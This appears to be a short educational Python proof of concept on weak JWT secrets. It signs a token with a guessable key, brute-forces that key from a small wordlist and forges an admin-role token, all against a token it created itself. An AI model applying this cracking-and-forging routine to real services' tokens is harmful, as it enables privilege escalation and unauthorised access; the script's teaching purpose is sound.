import jwt

print("[*] Starting JWT attack PoC...")

# Step 1: Create a token with weak secret
secret = "secret123"
payload = {"user": "aditya", "role": "user"}
token = jwt.encode(payload, secret, algorithm="HS256")
print("[+] Legit JWT generated:")
print("    ", token)

# Step 2: Brute force secret
print("[*] Attempting to brute-force the secret key...")
wordlist = ["123456", "password", "secret", "secret123", "admin"]
cracked_secret = None

for word in wordlist:
    try:
        jwt.decode(token, word, algorithms=["HS256"])
        cracked_secret = word
        print(f"[+] Secret key successfully cracked: '{word}'")
        break
    except jwt.InvalidSignatureError:
        print(f"[-] Tried '{word}' -> invalid signature")
        continue

# Step 3: Forge admin token
if cracked_secret:
    forged_payload = {"user": "attacker", "role": "admin"}
    forged_token = jwt.encode(forged_payload, cracked_secret, algorithm="HS256")
    print("[+] Forged Admin JWT created:")
    print("    ", forged_token)
    print("[*] Paste this token into https://jwt.io to see the forged 'role: admin'")
else:
    print("[-] Could not crack the secret key. Try a larger wordlist.")
